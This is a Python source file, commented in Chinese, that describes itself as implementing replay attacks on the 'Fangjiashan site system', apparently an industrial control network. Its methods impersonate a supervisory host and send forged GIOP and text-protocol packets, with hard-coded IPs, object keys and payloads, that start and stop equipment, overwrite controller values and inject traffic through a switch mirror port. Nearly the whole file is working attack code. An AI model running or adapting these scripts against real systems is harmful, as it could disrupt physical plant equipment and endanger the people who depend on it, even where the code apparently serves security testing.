from scapy.layers.inet import *
from scapy.arch.pcapdnet import L3pcapSocket
from protocols.packet_giop import *
import socket


# 此类中的方法，用于实现方家山现场系统的回放攻击
class TestFangJiaShan(object):
    def __init__(self):
        pass

    def test(self):
        self.test_sas_stop_owp5()

    # 功能：测试主机连接到CCT，使用GIOP协议下发OWP5启动命令
    # 说明：现场环境中，与CCT通信的是SAS
    #      实际流量中，SAS通过一条TCP长连接，向CCT发送命令包
    #      CCT接到命令包后，会根据执行过程的进展，通过另一条TCP长连接向SAS反馈执行状态
    #      而此方法模拟SAS端，首先与CCT建立TCP连接，之后发送GIOP请求包（idl_execute_command）
    #      后续的状态反馈同样通过另一条TCP连接返回给SAS
    # 注意：不同的SAS操作（启/停各类2层设备）都使用'idl_execute_command'命令包
    #      同一种方法（即：方法名相同），在不同服务器上（例如：CCT1和CCT2）对应的KeyAddress字段值不同
    #      不同的操作（例如：启动OWP5和停止OWP5），使用的负载（StubData字段）不同
    # 【重要】：使用脚本与CCT等现场设备建立TCP连接前，需要首先配置本机的静态IPv4地址
    #         例如：CCT1的IP地址为192.168.69.101
    #              与CCT1建立TCP连接前，需要配置本机IP地址为192.168.69.xxx（此网段内未使用的IP地址），子网掩码为255.255.255.0
    #              即测试主机与CCT1服务器处于同一网段，此外，测试主机连接交换机的端口不能是镜像口
    def test_sas_start_owp5(self):
        #        ip              port   KeyAddress
        # cct1:  192.168.69.101  11900  14010f00525354d4d88b5f86a90100030000000100000004000000
        # cct2:  192.168.69.102  12900  14010f00525354ced88b5f34c10c00030000000100000004000000
        # 与CCT2建立TCP连接
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.102', 12900))

        # 封装GIOP命令数据包
        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f00525354ced88b5f34c10c00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034380065010000002e0000002461646163735f7066612f636f6d'
                                '5f636d642f67656e6572616c5f737461727475705f6d616e616765722e73'
                                '6800000001000000090000006b69632d6f77703500000000020000000000'
                                '0000'
                                )
                   )

        # 发送至网络
        skt.send(bytes(pkt))

        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()

    def test_sas_stop_owp5(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.102', 12900))

        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f00525354ced88b5f34c10c00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034390065010000002b0000002461646163735f7066612f636f6d5f636d642f67656'
                                'e6572616c5f73746f705f6d616e616765722e7368000001000000090000006b69632d6f7770'
                                '35000000000200000000000000')
                   )

        skt.send(bytes(pkt))

        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()

    def test_cfr_aw_165p0_change_value(self):
        skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt_aw.connect(('192.168.1.1', 45678))

        '''
        skt_cfr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt_cfr.connect(('192.168.1.121', 33828))
        '''

        pkt_aw = '[26 (uwrite, 1, 0, 1)]\x0a' \
                 '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 3,             59)]\x0a' \
                 '[-1(1)]\x0a\x00'
        skt_aw.send(bytes(pkt_aw, encoding='utf-8'))

        print('Sleeping... 0.5s')
        time.sleep(0.5)

        '''
        pkt_cfr = '[154 (t_an_poll_changes, 2, 0, 2, 0, 0)]\x0a' \
                  '[0 (  0,  6528, 1059,24.0000000000000000, 9, 9, 1603087133, 420, 1)]\x0a' \
                  '[0 (  1,  6530, 35,24.0000000000000000, 8, 8, 1603087133, 420, 1)]\x0a' \
                  '[-1(1)]\x0a\x00'
        skt_cfr.send(bytes(pkt_cfr, encoding='utf-8'))
        '''

        print('Sleeping... 3s')
        time.sleep(3)
        skt_aw.close()
        # skt_cfr.close()

    def test_cfr_aw_190p0_start(self):
        skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt_aw.connect(('192.168.1.1', 45678))

        pkt_aw = '[26 (uwrite, 1, 0, 1)]\x0a' \
                 '[0 (  0,  0,314753535F4E393A313930504F5F432E4949303100, 9, -32768)]\x0a' \
                 '[-1(1)]\x0a\x00'
        # -32768: start, 16384: stop
        skt_aw.send(bytes(pkt_aw, encoding='utf-8'))

        print('Sleeping... 0.5s')
        time.sleep(0.5)

        print('Sleeping... 3s')
        time.sleep(3)
        skt_aw.close()

    def test_send_idl_db_locked_multiple_write_190po(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.111', 10000))

        request_id = 30000
        pkt = GIOP(type='Request',
                   RequestID=request_id,
                   KeyAddress=h2b('14010f0052535440df8b5ff6120300040000000100000005000000'),
                   RequestOperation='idl_db_locked_multiple_write',
                   StubData=h2b(
                       'fc00000003702f93682e0200150000000800c0000004940101180000000100000008000000'))
        #                                                           93: auto, 94: manual
        #                                                           95: stop, 96: start
        #               1 2 3 4 5 6 7 8 9 10  12  14  16  18  20  22  24  26  28  30  32  34  36  38  40  42
        #                                   11  13  15  17  19  21  23  25  27  29  31  33  35  37  39  41  43
        print('Sending... 190po, payload: {}'.format(to_hex(pkt)))
        skt.send(bytes(pkt))

        print('Sleeping... 1s')
        time.sleep(1)
        skt.close()

    def test_send_idl_db_locked_multiple_write_165vl(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.111', 10000))

        request_id = 30000
        pkt = GIOP(type='Request',
                   RequestID=request_id,
                   KeyAddress=h2b('14010f00525354f39d825f66c00300040000000100000005000000'),
                   RequestOperation='idl_db_locked_multiple_write',
                   StubData=h2b(
                       '0000000000000000000000001b0000001e00370001049c010200012e000000000000000600000000000000'))
        #               1 2 3 4 5 6 7 8 9 10  12  14  16  18  20  22  24  26  28  30  32  34  36  38  40  42
        #                                   11  13  15  17  19  21  23  25  27  29  31  33  35  37  39  41  43
        print('Sending... 190po, payload: {}'.format(to_hex(pkt)))
        skt.send(bytes(pkt))

        print('Sleeping... 1s')
        time.sleep(1)
        skt.close()

    def test_ping(self):
        pktp = Ether(dst='94:18:82:7c:9e:14', src='54:BF:64:0C:B4:B6') / \
               IP(dst='192.168.69.111', src='169.254.58.190', flags='DF', id=0) / \
               ICMP(id=0xfefe, seq=1)
        l2socket = conf.L2socket(iface='以太网 2')
        l2socket.send(pktp)

    # 通过OWP所接交换机的镜像端口，向网络注入数据包
    def test_owp_len246(self):
        pkt246 = IP(src='192.168.69.111', dst='192.168.69.201') / TCP(dport=19220) / \
                 GIOP(type='Request',
                      RequestID=56789,
                      KeyAddress=h2b('14010f005253544da8825f9b040f00030000000100000004000000'),
                      RequestOperation='idl_rcv_rdb_receive_data',
                      StubData=h2b('870000000200000000000100440000009e00000005002b020002070100000000000'
                                   '0c0420004a000000000000000000000000200000000000000c84246312020202020'
                                   '2020202020202020202020202020202020'))
        pkt426 = IP(src='192.168.69.111', dst='192.168.69.201') / TCP(dport=19470) / \
                 GIOP(type='Request',
                      RequestID=56791,
                      KeyAddress=h2b('14010f005253544ea8825fb7640200030000000100000004000000'),
                      RequestOperation='idl_rcv_rdb_receive_data',
                      StubData=h2b('8b0000000200000000000100f8000000fa00000005002a020002c20000000000000'
                                   '0000000000000000000000000c842ffff7fffffff7f7fffff7fffffff7f7fffff7f'
                                   'ffffff7f7fffff7fffffff7f7f25202020202020202020202020202020202020202'
                                   '0202020202020202020202020202020463120202020202020202020202020202020'
                                   '202020202020fb00000005002b020002c2000000000000000000000080420000000'
                                   '00000c842ffff7fffffff7f7fffff7fffffff7f7fffff7fffffff7f7fffff7fffff'
                                   'ff7f7f2520202020202020202020202020202020202020202020202020202020202'
                                   '02020202020463120202020202020202020202020202020202020202020'))
        l3socket = conf.L3socket(iface='以太网 2')
        l3socket.send(pkt246)
        l3socket.send(pkt426)
